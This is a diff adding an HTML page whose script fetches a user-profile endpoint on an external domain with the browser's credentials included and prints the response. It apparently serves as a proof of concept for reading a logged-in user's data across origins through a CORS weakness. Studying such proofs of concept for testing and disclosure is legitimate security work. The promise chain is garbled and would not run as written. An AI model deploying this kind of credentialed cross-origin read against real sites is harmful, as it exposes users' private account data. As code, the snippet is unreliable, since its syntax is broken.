@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <head>
+
+    </head>
+    <body>
+        <script>
+            fetch('https://systemnodesync.dpdns.org/api/v2/user-profile/cache/sync-manifest', {
+                    credentials: 'include'
+                    })
+                .then(response => response.json()).then(
+                    .then(data => {
+                        document.body.innerText = JSON.stringify(data, null, 2);
+                    });
+                    )
+        </script>
+    </body>
+</html>
